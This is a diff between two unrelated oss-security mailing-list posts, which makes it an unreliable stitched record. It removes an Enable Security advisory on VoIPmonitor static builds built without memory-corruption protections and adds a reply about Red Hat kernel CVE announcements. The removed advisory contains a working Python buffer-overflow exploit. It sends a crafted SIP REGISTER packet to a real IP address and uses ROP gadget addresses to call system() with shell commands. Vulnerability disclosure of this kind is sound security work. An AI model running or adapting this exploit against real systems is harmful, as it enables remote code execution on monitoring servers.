@@ -1,138 +1,63 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/03/15/3
-Message-Id: <e835517e-f199-4cae-a9cb-33c89a77c916@www.fastmail.com>
-Date: Mon, 15 Mar 2021 13:50:26 +0100
-From: "Sandro Gauci" <sandro@...blesecurity.com>
-To: oss-security@...ts.openwall.com, bugtraq@...urityfocus.com, fulldisclosure@...lists.org, voipsec@...psa.org, submissions@...ketstormsecurity.org, vuln@...unia.com, cert@...t.org
-Subject: ES2021-04: VoIPmonitor static builds are compiled without any standard memory corruption protection
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/03/18/7
+Message-ID: <YFOLo/QrlgIrFotJ@wopr>
+Date: Thu, 18 Mar 2021 10:19:31 -0700
+From: Kurt H Maier <khm@...ops.net>
+To: oss-security@...ts.openwall.com
+Subject: Re: Re: CVE-2021-20219 Linux kernel: improper synchronization in flush_to_ldisc() can lead to DoS
 Content-Type: text/plain; charset=utf-8
 
-# VoIPmonitor static builds are compiled without any standard memory corruption protection
+On Thu, Mar 18, 2021 at 01:08:21PM +0100, Greg KH wrote:
+> 
+> But none of that takes into account for the backporting of commits into
+> the stable tree, you need a different tool for that, which many of us
+> have our own.  If you use that you will see that the above commit really
+> is in lots of fixed kernel trees:
+> 
+> $ id_found_in 3d63b7e4ae0dc5e02d28ddd2fa1f945defc68d81
+> 3.16.61 3.18.115 4.4.140 4.9.112 4.14.54 4.17.5 4.18
 
-- Fixed versions: N/A
-- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2021-04-voipmonitor-staticbuild-memory-corruption-protection
-- VoIPmonitor Security Advisory: none
-- Tested vulnerable versions: 27.5
-- Timeline:
-    - Report date: 2021-02-10 & 2021-02-13
-	- Enable Security advisory: 2021-03-15
+It's not really Red Hat's fault that there are six hundred "stable"
+kernel versions, which each change approximately weekly.  It's generally
+not worth tracking, and it would not be sane to expect Red Hat to seek 
+or announce CVEs for git branches they don't maintain.
 
-## Description
+> > Since this issue was reported to us,  identified as a security flaw,
+> > and was fixed in the upstream, we decided to assign a CVE.
+> 
+> But then you announce that CVE to the community with no context or
+> information which only causes us to have to do lots of extra work.
 
-The binaries available for download at <https://www.voipmonitor.org/download> are built without any memory corruption protection in place. The following is output from the tool `hardening-check`:
+They should have included the details which they later added, but I
+can't even remember the last time Red Hat reported a kernel
+vulnerability which contained enough information to satisfy you, so I
+wouldn't really blame them if they gave up trying to please you.
 
-```
-hardening-check voipmonitor:
- Position Independent Executable: no, normal executable!
- Stack protected: no, not found!
- Fortify Source functions: unknown, no protectable libc functions used
- Read-only relocations: no, not found!
- Immediate binding: no, not found!
- Stack clash protection: unknown, no -fstack-clash-protection instructions found
- Control flow integrity: unknown, no -fcf-protection instructions found!
-```
+> If it's Red Hat's goal to get some people in the Linux kernel community
+> mad at them, it's working well.  If it's Red Hat's goal to somehow help
+> the community out with this type of announcement, it's not working at
+> all.  You failed to site the fix, when it was, who did the fix, who
+> found the fix, and where it was actually fixed in, all things that
+> people here actually would like to know.
 
-When stack protection together with Fortify Source and other protection mechanisms are in place, exploitation of memory corruption vulnerabilities normally results in a program crash instead of leading to remote code execution. Most modern compilation systems create executable binaries with these features built-in by default. When these features are not used, attackers may easily exploit memory corruption vulnerabilities, such as buffer overflows, to run arbitrary code. In this advisory we will demonstrate how a buffer overflow reported in a separate advisory, could be abused to run arbitrary code because of the lack of standard memory corruption protection in the static build releases of VoIPmonitor.
+Some people in the Linux kernel community seem to get mad as a hobby,
+and measure their success by volume of email sent about it.  Those of
+us who administer Red Hat systems generally find the level of detail
+sufficient and I for one appreciate Rohit's announcements.  This one
+could have been better, I agree.
 
-The vendor has explained that:
+Since MITRE set about destroying the CVE assignment process, reporting
+of CVE assignments has been optional and to be frank we're lucky to get
+this much these days.
 
-> we are not going to enable the protection in the static builds as the speed is critical on many installations
+> So, what really is your goal here?
 
-> Our static build also uses tcmalloc (recommended version) which is required for high packet/second processing as the libc allocator is not fast enough especially on NUMA systems. For high packet/second traffic FORTIFY_SOURCE can introduce a lot of additional CPU cycles. If using custom builds with FORTIFY_SOURCE - they should compare if the sniffer did not introduced higher CPU usage.
+What's yours?  You don't seem to run RHEL, so why get bent out of shape
+if they slip up while reporting a CVE assignment?  I guess more 
+accurately, why get bent out of shape *every time* they report a CVE
+assignment?  Is it possible for you to just stop, so those of us who
+find value in the reports don't have to page through all the complaining
+in order to read it?  Or is oss-security just doomed to the "greg is mad
+at the email" cycle forever?
 
-While we understand the vendor's position, we are issuing an advisory to ensure that end users can make informed risk-based decisions.
-
-## Impact
-
-The lack of standard memory corruption protection mechanisms means that such vulnerabilities may lead to remote code execution.
-
-## How to reproduce the issue
-
-1. Execute the static build of VoIPmonitor (such as https://www.voipmonitor.org/current-stable-sniffer-static-64bit.tar.gz)
-2. Start the live sniffer from the VOIPMonitor GUI or via the manager on port 5029
-3. Execute the following Python program so that VOIPMonitor is able to capture the packet
-4. Observe the payload being executed by the `voipmonitor` process, i.e. the following:
-    - current user is printed due to execution of the `whoami` command
-    - `h4x0r was here` is also printed
-    - a file has been created in `/tmp/woot`
-
-```python
-import struct
-import socket
-
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-payload_size=32607
-# Pad with As
-payload = b'A' * 703
-payload_size-=len(payload)
-
-# Write system payload
-cmd=b'whoami;echo "h4x0r was here";touch /tmp/woot\x00'
-payload+=cmd
-payload_size-=len(cmd)
-
-# Pad some more so that we can overwrite the save_packet_sql's function return address
-payload += b'A' * payload_size
-
-# Call a ROP gadged that increments the value of the RDI register, 
-# which will now point to the value set by cmd
-payload += struct.pack('<Q', 0x0000000000b222f1)
-
-# Return to system() to execute the value in RDI
-payload += struct.pack('<Q', 0xb22fd0)
-
-# Return to exit() to exit gracefully
-payload += struct.pack('<Q', 0xf60a20)
-
-msg=b'REGISTER %s SIP/2.0\r\n' % (payload)
-msg+=b'Via: SIP/2.0/UDP 192.168.1.132:35393;rport;branch=z9hG4bK-kwtTkrdNAO2Wvw0v\r\n'
-msg+=b'Max-Forwards: 70\r\n'
-msg+=b'From: <sip:85861710@...o.sipvicious.pro>;tag=mnq1nKGNZHNUkNOG\r\n'
-msg+=b'To: <sip:85861710@...o.sipvicious.pro>\r\n'
-msg+=b'Call-ID: 93X9dNZO2qdcfpdu\r\n'
-msg+=b'CSeq: 1 REGISTER\r\n'
-msg+=b'Contact: <sip:85861710@....168.1.132:35393;transport=udp>\r\n'
-msg+=b'Expires: 60\r\n'
-msg+=b'Content-Length: 0\r\n'
-msg+=b'\r\n'
-s.sendto(msg, ('167.71.58.84', 5060))
-
-```
-
-## Solution and recommendations
-
-Users who would like to have standard memory corruption protection for VoIPmonitor should compile the binaries themselves and apply their own upgrades rather than using the upgrade feature from the VoIPmonitor GUI / sensors page.
-
-We recommended the following to the vendor:
-
-> Our recommendation is that standard memory corruption protection be switched on by default in the official binary build of VoIPmonitor. If there are specific requirements for specific systems that require such features to be switched off, then additional binaries should be offered, with adequate documentation of the risks involved.
-
-> Do note that memory corruption vulnerabilities should also be addressed and fixed even if security features, such as Fortify, are used.
-
-## Acknowledgements
-
-Enable Security would like to thank Martin Vit and the developers at VoIPmonitor for the very quick responses and explanations with regards to this security issue.
-
-## About Enable Security
-
-[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.
-
-## Disclaimer
-
-The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.
-
-## Disclosure policy
-
-This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.
-
-
---
- 
-    Sandro Gauci, CEO at Enable Security GmbH
-
-    Register of Companies:       AG Charlottenburg HRB 173016 B
-    Company HQ:                       Neuburger Straße 101 b, 94036 Passau, Germany
-    PGP/Encrypted comms:       https://keybase.io/sandrogauci
-    Our blog:                                https://www.rtcsec.com
-    Other points of contact:       https://enablesecurity.com/#contact-us
+khm
